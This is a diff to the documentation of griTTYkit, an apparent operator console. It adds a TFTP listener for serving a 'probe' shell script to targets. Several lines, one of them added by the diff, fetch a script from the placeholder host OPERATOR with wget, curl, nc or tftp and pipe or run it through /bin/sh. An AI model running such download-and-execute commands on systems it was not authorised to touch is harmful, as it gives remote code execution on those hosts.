@@ -10,6 +10,17 @@ scripts/grit-console \
   --probe-name probe.sh
 ```
 
+The HTTP probe listener is `probe-http` in the console delivery view. A separate
+TFTP fallback listener can serve the same script over UDP:
+
+```sh
+scripts/grit-console \
+  --transport probe-tftp \
+  --listen-host 0.0.0.0 \
+  --probe-tftp-port 22208 \
+  --probe-name probe.sh
+```
+
 `scripts/grit-console --transport probe` serves a small architecture-agnostic
 `/bin/sh` script and accepts the script's result upload. This is intended for
 first contact when the operator does not yet know which griTTYkit artifact to
@@ -27,6 +38,7 @@ On the target, download and run it with whatever basic tool is available:
 wget -O- http://OPERATOR:22207/probe.sh | /bin/sh
 curl -fsSL http://OPERATOR:22207/probe.sh | /bin/sh
 printf 'GET /probe.sh HTTP/1.0\r\nHost: OPERATOR\r\n\r\n' | nc OPERATOR 22207 | sed '1,/^\r*$/d' | /bin/sh
+tftp -g -r probe.sh -l /tmp/probe.sh OPERATOR 22208 && /bin/sh /tmp/probe.sh
 ```
 
 The line-oriented console wraps the same workflow:
@@ -39,11 +51,11 @@ grit[all]> probe config --write-config configs/grit.conf
 grit[all]> probe serve --start
 ```
 
-`probe delivery` shows target-side `wget`, `curl`, and raw `nc` HTTP GET
-commands for the current direct or bridged probe route. The current listener is
-`probe-http`; future listener names are reserved for `probe-tftp`, `probe-ftp`,
-and `probe-dns` so the console can grow into separate first-contact delivery
-services without changing the probe result workflow.
+`probe delivery` shows target-side `wget`, `curl`, raw `nc` HTTP GET, and TFTP
+commands for the current probe route. The current listener families are
+`probe-http` and `probe-tftp`; future listener names are reserved for
+`probe-ftp` and `probe-dns` so the console can grow into separate first-contact
+delivery services without changing the probe result workflow.
 
 `probe serve --start` stages the matching release artifact and prints target
 fetch options. On a target that does not have griTTYkit yet, use the printed
